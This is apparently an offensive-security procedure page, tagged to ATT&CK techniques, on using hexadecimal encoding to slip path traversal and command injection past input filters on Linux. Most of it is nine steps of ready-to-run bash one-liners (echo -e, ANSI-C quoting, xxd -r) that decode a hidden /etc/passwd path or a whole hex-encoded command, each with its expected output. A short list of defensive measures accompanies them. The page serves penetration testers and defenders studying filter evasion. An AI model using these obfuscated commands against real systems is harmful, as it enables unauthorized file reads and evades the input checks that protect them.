---
id: 6a553be7-438f-4416-87b9-8b1a7adeaa6b
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:57.189319+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Bypass characters filter via hex encoding]]'
  - '[[tags/Command Injection]]'
  - '[[tags/Filter Bypasses]]'
commands:
  - '[[commands/bash-echo-hex-decode]]'
  - '[[commands/bash-cat-echo-hex-path]]'
  - '[[commands/bash-variable-hex-decode-cat]]'
  - '[[commands/bash-echo-command-sub-hex]]'
  - '[[commands/bash-xxd-hex-reverse-plain]]'
  - '[[commands/bash-cat-xxd-hex-reverse]]'
  - '[[commands/bash-xxd-hex-reverse-ps]]'
  - '[[commands/bash-cat-xxd-hex-ps]]'
platforms:
  - Linux
tools: []
validated: true
---

# Hex-Encoded-Path-Traversal-Bypass

## Summary

This procedure demonstrates how to bypass character filters in path traversal or command injection vulnerabilities by encoding file paths in hexadecimal format. By using hex encoding, attackers can evade input sanitization that blocks special characters like slashes or backslashes, allowing access to sensitive files such as /etc/passwd on Linux systems. It is particularly useful in scenarios where direct path traversal is filtered, but the application decodes or interprets hex input before execution.

## Description

Hex-encoded path traversal exploits weaknesses in applications that fail to properly sanitize or decode user input before passing it to file system operations or command executions. The technique involves converting the target file path (e.g., /etc/passwd) into its hexadecimal representation (e.g., 2f6574632f706173737764) and using shell features or tools to decode it at runtime. This can be applied in command injection contexts where the application executes system commands with user-supplied arguments, or in file inclusion vulnerabilities. The target environment is typically a web application or service running on Linux with insufficient input validation, such as a vulnerable CGI script or misconfigured server. Success enables reading arbitrary files, potentially leading to information disclosure or further exploitation like privilege escalation.

## Requirements

1. Access to a vulnerable application or service that allows command injection or path traversal with partial filter bypass (e.g., blocks '/' but allows hex).
2. A Linux shell environment (bash) on the target or via an existing injection point.
3. Basic knowledge of hex encoding; tools like xxd or online converters for preparation.
4. Network access if exploiting remotely via HTTP requests (e.g., using curl or Burp Suite).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to reject or properly decode hex-encoded inputs, using whitelisting for allowed paths.
- Deploy a web application firewall (WAF) to detect and block hex-encoded payloads, such as patterns matching \xHH or hex strings in file paths.
- Run applications with least privilege, restricting file system access to prevent reading sensitive files like /etc/passwd.
- Enable logging of all command executions and file accesses, monitoring for anomalies like hex decoding in process arguments.
- Use secure coding practices, such as avoiding direct user input in system calls (e.g., prefer APIs over shell commands).

## Objectives

1. Bypass character filters to access restricted files on the target system.
2. Execute arbitrary file reads via obfuscated paths in command injection scenarios.
3. Demonstrate evasion of basic input sanitization for information disclosure.

## Instructions

### Step 1: Prepare Hex-Encoded Path

**Context**: Convert the target file path to hex to evade filters. For example, encode /etc/passwd as 2f6574632f706173737764 or use \x escapes.

This step sets up the encoded string for use in subsequent commands.

### Step 2: Decode and Display Path Using Echo

**Context**: Use bash's echo with -e to interpret hex escapes and display the decoded path, verifying the encoding works without accessing the file yet.

**Command** ([[commands/bash-echo-hex-decode]]):
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

> This command decodes the hex escapes to output the plain path /etc/passwd. Expected output: /etc/passwd. Use this to test if the shell interprets the encoding correctly.

### Step 3: Read File Using Cat with Echo Substitution

**Context**: Inject the hex-encoded path into a cat command via backticks for command substitution, bypassing filters on direct paths.

**Command** ([[commands/bash-cat-echo-hex-path]]):
```bash
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
```

> The inner echo decodes the path, and cat reads the file. Expected output: root:x:0:0:root:/root:/bin/bash (first line of /etc/passwd). Success confirms file access via hex bypass.

### Step 4: Store Encoded Path in Variable and Read File

**Context**: Assign the hex path to a bash variable using $'...' syntax for ANSI-C quoting, then use it in cat to read the file.

**Command** ([[commands/bash-variable-hex-decode-cat]]):
```bash
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
```

> The variable decodes on assignment. Expected output: Contents of /etc/passwd. This method is useful for multi-step injections where the path is reused.

### Step 5: Execute Full Command with Encoded Arguments

**Context**: Encode the entire command (including spaces) using $'...' and execute via substitution to run cat on the hidden path.

**Command** ([[commands/bash-echo-command-sub-hex]]):
```bash
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
```

> This decodes and runs 'cat /etc/passwd'. Expected output: File contents. Ideal for scenarios where the full command is filtered.

### Step 6: Decode Hex String Using xxd (Plain Mode)

**Context**: Use xxd to reverse a continuous hex string (without \x) into the binary path, as an alternative to echo.

**Command** ([[commands/bash-xxd-hex-reverse-plain]]):
```bash
xxd -r -p <<< 2f6574632f706173737764
```

> xxd converts the hex dump back to text. Expected output: /etc/passwd. Requires xxd tool availability.

### Step 7: Read File Using Cat with xxd Substitution

**Context**: Combine xxd decoding with cat substitution for file access using continuous hex strings.

**Command** ([[commands/bash-cat-xxd-hex-reverse]]):
```bash
cat `xxd -r -p <<< 2f6574632f706173737764`
```

> Decodes and pipes to cat. Expected output: /etc/passwd contents. This bypasses filters expecting \x format.

### Step 8: Decode Using xxd with Process Substitution

**Context**: Use process substitution to feed the hex string to xxd for decoding in more complex shell environments.

**Command** ([[commands/bash-xxd-hex-reverse-ps]]):
```bash
xxd -r -ps <(echo 2f6574632f706173737764)
```

> The -ps flag handles spaces in hex. Expected output: /etc/passwd.

### Step 9: Read File with xxd Process Substitution

**Context**: Final variation using process substitution for robust decoding in cat.

**Command** ([[commands/bash-cat-xxd-hex-ps]]):
```bash
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

> Combines all for file read. Expected output: File contents. Use if other methods fail due to shell restrictions.
